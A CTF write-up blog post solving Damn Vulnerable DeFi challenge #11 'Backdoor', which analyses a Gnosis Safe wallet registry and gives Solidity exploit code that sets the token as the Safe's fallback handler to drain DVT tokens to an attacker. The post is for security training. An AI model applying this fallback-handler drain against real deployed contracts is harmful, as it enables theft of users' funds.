---
title: 'Damn Vulnerable DeFi Challenge #11 Solution — Backdoor'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>We need to find a way to steal all the DVT token in the Gnosis Safe wallet created.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2023-01-02T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

This is Part 11 of the ["Let’s play Damn Vulnerable DeFi CTF"](https://stermi.xyz/blog/lets-play-damn-vulnerable-defi) series, where I will explain how to solve each challenge.

> [Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.
> Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #11  — Backdoor

> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of [Gnosis Safe wallets](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol). When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
>
> To make sure everything is safe and sound, the registry tightly integrates with the legitimate [Gnosis Safe Proxy Factory](https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol), and has some additional safety checks.
>
> Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
>
> Your goal is to take all funds from the registry. In a single transaction.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/free-rider)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/free-rider/free-rider.challenge.js)

## The attacker end goal

We start with zero ETH (well, at least some just to pay for gas :D) and no DVT token. Our goal is to find a way to be able to steal all the DVT token that are transferred to the Gnosis Safe wallets created and registered to the beneficiaries.

## Study the contracts

First, we need to understand how the flow to register a new wallet works and how the Gnosis Safe Wallet and Gnosis Safe Wallet Factory interacts with the Wallet Registry.

As far as I can see, anyone can register a new wallet on behalf of a user by interacting with the `GnosisSafeProxyFactory`

On the factory, you have two options to create a new wallet

1. Execute `GnosisSafeProxyFactory.createProxyWithNonce`
2. Execute `GnosisSafeProxyFactory.createProxyWithCallback`

The `createProxyWithCallback` will internally use the `createProxyWithNonce` but has two main differences

1. The `salt` used to generate the wallet contract is equal to `uint256(keccak256(abi.encodePacked(saltNonce, callback)));`
2. After the deployment of the proxy wallet, if `callback` is defined as an input parameter (it's different from `address(0)`) the function will execute `callback.proxyCreated(proxy, _singleton, initializer, saltNonce)`

To trigger the `proxyCreated` callback inside `WalletRegistry` we need to use `GnosisSafeProxyFactory.createProxyWithCallback` to generate a new proxy wallet.

### `WalletRegistry.sol`

This is the main entry point of our challenge.

#### Variables

- `uint256 private constant MAX_OWNERS = 1` number of owners that the wallet must have to be accepted
- `uint256 private constant MAX_THRESHOLD = 1` numbers of owners required to execute a transaction from the wallet
- `uint256 private constant TOKEN_PAYMENT = 10 ether` number of DVT token sent to a freshly created wallet
- `address public immutable masterCopy` address of the master copy of the Proxy Wallet used to verify that the wallet created is not a fake one
- `address public immutable walletFactory` address of the wallet factory to check the source that generated the wallet
- `IERC20 public immutable token` the DVT token
- `mapping (address => bool) public beneficiaries` mapping of whitelisted beneficiaries that will get the DVT on their gnosis safe wallet
- `mapping (address => address) public wallets` mapping of wallet created associated with the beneficiary

#### `constructor`

```solidity
constructor(
    address masterCopyAddress,
    address walletFactoryAddress,
    address tokenAddress,
    address[] memory initialBeneficiaries
) {
    require(masterCopyAddress != address(0));
    require(walletFactoryAddress != address(0));

    masterCopy = masterCopyAddress;
    walletFactory = walletFactoryAddress;
    token = IERC20(tokenAddress);

    for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
        addBeneficiary(initialBeneficiaries[i]);
    }
}
```

Nothing special to see here, they do some sanity check on the input parameters, initialize all the `immutable` variables and initialize the list of beneficiaries that will be whitelisted to receive the DVT tokens on their gnosis safe wallet once created.

#### Manage the beneficiaries

```solidity
function addBeneficiary(address beneficiary) public onlyOwner {
    beneficiaries[beneficiary] = true;
}
```

This function is used to add new beneficiaries to the whitelist mapping. While it is public, it's protected by the `onlyOwner` modifier. Because there's no way to get the control of the contract and become the owner, we will not be able to add ourselves (the attacker) as a beneficiary.

If it was possible, we could simply add to the list of beneficiaries, create a wallet, get the DVT token, call again the function to override the value, and start again until we have drained all the available DVT token in the registry contract.

```solidity
function _removeBeneficiary(address beneficiary) private {
    beneficiaries[beneficiary] = false;
}
```

Nothing to see here, it's a private function that cannot be called if not by the contract itself.

#### `proxyCreated`

This is the main entry point and more interesting function of the contract itself. Let's have a look at it

```solidity
function proxyCreated(
    GnosisSafeProxy proxy,
    address singleton,
    bytes calldata initializer,
    uint256
) external override {
    // Make sure we have enough DVT to pay
    require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");

    address payable walletAddress = payable(proxy);

    // Ensure correct factory and master copy
    require(msg.sender == walletFactory, "Caller must be factory");
    require(singleton == masterCopy, "Fake mastercopy used");

    // Ensure initial calldata was a call to `GnosisSafe::setup`
    require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");

    // Ensure wallet initialization is the expected
    require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
    require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");

    // Ensure the owner is a registered beneficiary
    address walletOwner = GnosisSafe(walletAddress).getOwners()[0];

    require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");

    // Remove owner as beneficiary
    _removeBeneficiary(walletOwner);

    // Register the wallet under the owner's address
    wallets[walletOwner] = walletAddress;

    // Pay tokens to the newly created wallet
    token.transfer(walletAddress, TOKEN_PAYMENT);
}
```

What does this function do in practice? This function is the callback that the `GnosisSafeProxyFactory` will call when `GnosisSafeProxyFactory.createProxyWithCallback` is executed, and a gnosis safe wallet has been created successfully.

Let's review it step by step to understand if we can find an exploitable way to gain access to those DVT tokens.

1. `require(token.balanceOf(address(this)) >= TOKEN_PAYMENT);` checks that the registry has enough DVT token left to send to the new wallet
2. `require(msg.sender == walletFactory);` checks that the sender is the real wallet factory that has generated the wallet. Because the function is public, it could be called by anyone!
3. `require(singleton == masterCopy);` checks that the `singleton` used to generate the new gnosis wallet is the one that the registry has whitelisted. This check is important to know that the code of the wallet contract has not been manipulated.
4. `require(bytes4(initializer[:4]) == GnosisSafe.setup.selector);` check that the deployer of the wallet contract has also correctly initialized and setupped the wallet proxy. This is important to prevent that the wallet is initialized **after** that the registry has sent the tokens!
5. `require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD);` and `require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS);` checks that the wallet has been created with only one owner (the beneficiary) and only the owner can execute transactions from the wallet
6. `require(beneficiaries[walletOwner])` check that the owner of the wallet (the only owner in the list) is also one of the whitelisted beneficiary from the mapping
7. `_removeBeneficiary(walletOwner);` remove the beneficiary from the list. This is needed to prevent the same beneficiary to create multiple gnosis safe wallets and get more DVT than allocated (1 wallet per beneficiary)
8. `wallets[walletOwner] = walletAddress;` register the beneficiary to the wallet address. This is not needed for security, but more for external usage (dApps/other contracts)
9. `token.transfer(walletAddress, TOKEN_PAYMENT);` at the very end, the contract transfers the correct amount of DVT tokens to the freshly created wallet

Are there any flows in the process? Not as far as I can see, honestly.

- The check on the `walletFactory` allows only the **real** factory to call the callback
- The check on `masterCopy` prevent us to create a "fake" wallet contract to inject our attack into
- The check on the `initializer` make sure that the wallet has been already initialized and we cannot inject anything after the token has been transferred
- The check on the number of owners/threshold prevent us to add to the list of owner and execute a transaction directly from the wallet to transfer the tokens
- The check on the whitelisted map of beneficiaries (without the ability to update it) prevent us to create a wallet for ourselves

It seems that the contract itself is not attackable... Let's see if we can find something inside the `GnosisSafe` wallet code that could be used with this flow

### `GnosisSafe.sol`

You can look at the code used by the challenge directly on the Gnosis GitHub contract: [GnosisSafe.sol](https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol)

`GnosisSafe` is a multisignature wallet with support for confirmations using signed messages based on ERC191. Basically, allows a group of users (or just one) to administer a wallet contract and execute transactions based on how the contract has been configured.

The contract is very flexible and extendible, and usually these characteristics come with some tradeoff on the security side. To be clear, not that the contract is not safe, but that the user must be very aware of what could be wrong if the contract is misconfigured or misused.

Can we find a way to add a backdoor to the Gnosis Wallet configuration (exploiting the huge flexibility of its mechanism) to be able to steal the DVT tokens?

Let's take a look at their `setup` function, called in the same transaction of the wallet deployment.

```solidity
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
) external {
    // setupOwners checks if the Threshold is already set, therefore preventing that this method is called twice
    setupOwners(_owners, _threshold);
    if (fallbackHandler != address(0)) internalSetFallbackHandler(fallbackHandler);
    // As setupOwners can only be called if the contract has not been initialized we don't need a check for setupModules
    setupModules(to, data);

    if (payment > 0) {
        // To avoid running into issues with EIP-170 we reuse the handlePayment function (to avoid adjusting code of that has been verified we do not adjust the method itself)
        // baseGas = 0, gasPrice = 1 and gas = payment => amount = (payment + 0) * 1 = payment
        handlePayment(payment, 0, 1, paymentToken, paymentReceiver);
    }
    emit SafeSetup(msg.sender, _owners, _threshold, to, fallbackHandler);
}
```

We are looking for a way to add a backdoor that allows an attacker to transfer all the DVT tokens at some point after that the wallet has been deployed, initialized and has received the DVT tokens from the `WalletRegistry`. In particular, we are looking at ways to be able to execute arbitrary low-level calls because the owner of the DVT tokens is not the owner of the wallet but the wallet itself.

As we already saw, we cannot be one of the owners of the contract, only the beneficiary can be, otherwise the callback on `WalletRegistry` would revert.

If you look at `handlePayment(payment, 0, 1, paymentToken, paymentReceiver);` we could leverage the code to send an arbitrary token to an arbitrary receiver

```solidity
function handlePayment(
    uint256 gasUsed,
    uint256 baseGas,
    uint256 gasPrice,
    address gasToken,
    address payable refundReceiver
) private returns (uint256 payment) {
    // solhint-disable-next-line avoid-tx-origin
    address payable receiver = refundReceiver == address(0) ? payable(tx.origin) : refundReceiver;
    if (gasToken == address(0)) {
        // For ETH we will only adjust the gas price to not be higher than the actual used gas price
        payment = gasUsed.add(baseGas).mul(gasPrice < tx.gasprice ? gasPrice : tx.gasprice);
        require(receiver.send(payment), "GS011");
    } else {
        payment = gasUsed.add(baseGas).mul(gasPrice);
        require(transferToken(gasToken, receiver, payment), "GS012");
    }
}
```

The problem with this is that it would be executed inside the `setup` process and in that very specific time the wallet does not own yet the DVT tokens.

We need to find something that allows us to transfer those tokens **after** the callback.

Let's look at `fallbackHandler`, that is setupped by calling `internalSetFallbackHandler` inside `setup`. If we look at `FallbackManager` we see that when a `fallbackHandler` address is provided, the wallet will "gain" a fallback method that will allow use to receive fallback calls

```solidity
fallback() external {
    bytes32 slot = FALLBACK_HANDLER_STORAGE_SLOT;
    // solhint-disable-next-line no-inline-assembly
    assembly {
        let handler := sload(slot)
        if iszero(handler) {
            return(0, 0)
        }
        calldatacopy(0, 0, calldatasize())
        // The msg.sender address is shifted to the left by 12 bytes to remove the padding
        // Then the address without padding is stored right after the calldata
        mstore(calldatasize(), shl(96, caller()))
        // Add 20 bytes for the address appended add the end
        let success := call(gas(), handler, 0, 0, add(calldatasize(), 20), 0, 0)
        returndatacopy(0, 0, returndatasize())
        if iszero(success) {
            revert(0, returndatasize())
        }
        return(0, returndatasize())
    }
}
```

Each time a function not present in the wallet smart contract is executed, this fallback method will be executed and will perform a low-level call (written in Yul this time) to the `handler` address (the value is the one we have provided during the `setup` process via the `fallbackHandler` input) and as the `calldata` value of the call will forward the whole `calldata` passed to the sender.

We are into something! This allows us to execute **any** function available on the `handler` contract, specifying an arbitrary payload data.

What would happen if we setup the wallet by passing the **address of the DVT token** as the `fallbackHandler`? This would allow us to make the **wallet itself** execute a low-level call directly on the token itself!

## Prepare the attack

Now that we have found the solution, it's pretty easy to write the test. The test will iterate over all the beneficiaries, create a wallet with the proper configuration and after the creation transfer all the tokens to the attacker address!

```solidity
for( uint i = 0; i < beneficiaries.length; i++ ) {
    // setup wallet beneficiary
    address[] memory walletOwners = new address[](1);
    walletOwners[0] = beneficiaries[i];

    // setup the initializer of the wallet by setting the token as the wallet's `fallbackHandler`
    // this will allow us to execute calls to the token contract from the wallet without being the owner
    bytes memory initializer = abi.encodeWithSignature(
        "setup(address[],uint256,address,bytes,address,address,uint256,address)",
        walletOwners,   // _owners
        1,              // _threshold
        address(0),     // to
        "",             // data
        address(token), // fallbackHandler
        address(0),     // paymentToken
        0,              // payment
        address(0)      // paymentReceiver
    );

    // generate the wallet and call the registry callback
    GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy), initializer, 1, walletRegistry);


    // use the fallback we setup earlier to directly transfer DVT tokens from the wallet to the attacker!
    vm.prank(attacker);
    (bool approveSuccess, ) = address(proxy).call(
        abi.encodeWithSignature("transfer(address,uint256)", attacker, AMOUNT_TOKENS_DISTRIBUTED_PER_WALLET)
    );
    assertEq(approveSuccess, true);
}
```

You can find the full solution on GitHub, looking at [BackdoorTest.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/backdoor/BackdoorTest.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract BackdoorTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
